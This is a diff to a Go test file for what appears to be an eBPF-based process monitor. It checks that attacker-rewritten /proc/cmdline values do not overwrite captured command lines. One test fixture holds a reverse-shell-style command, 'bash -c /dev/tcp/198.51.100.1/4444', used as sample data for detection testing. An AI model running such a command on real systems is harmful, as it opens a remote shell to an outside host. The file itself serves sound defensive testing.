@@ -84,7 +84,35 @@ func TestCanonicalizePathDefeatsAllBypasses(t *testing.T) {
 			if len(ev.Ancestry) != 1 || ev.Ancestry[0].Comm != "claude" {
 				t.Fatalf("expected claude ancestry, got %+v", ev.Ancestry)
 			}
+			if ev.Cwd != "/home/alice/.ssh" {
+				t.Fatalf("expected Cwd=/home/alice/.ssh, got %q", ev.Cwd)
+			}
 		})
+	}
+}
+
+func TestTrackerPreservesEBPFCmdlineAgainstProcOverwrite(t *testing.T) {
+	fr := &fakeProcReader{
+		procs: map[int]model.ProcessInfo{
+			200: {PID: 200, PPID: 1, StartTime: 555, Comm: "bash", Exe: "/usr/bin/bash", Cwd: "/", Cmdline: "harmless-rewritten-argv0-padding-longer-than-original"},
+		},
+	}
+	tr := NewTracker(fr)
+	ev := model.Event{
+		Type:    model.EventExec,
+		PID:     200,
+		Comm:    "bash",
+		Cmdline: "bash -c /dev/tcp/198.51.100.1/4444",
+	}
+	tr.Enrich(&ev)
+	if ev.Cmdline != "bash -c /dev/tcp/198.51.100.1/4444" {
+		t.Fatalf("eBPF Cmdline must not be overwritten by /proc/cmdline, got %q", ev.Cmdline)
+	}
+	if ev.ProcCmdline != "harmless-rewritten-argv0-padding-longer-than-original" {
+		t.Fatalf("expected ProcCmdline to retain /proc/cmdline separately, got %q", ev.ProcCmdline)
+	}
+	if ev.Cwd != "/" {
+		t.Fatalf("expected Cwd=/, got %q", ev.Cwd)
 	}
 }
 
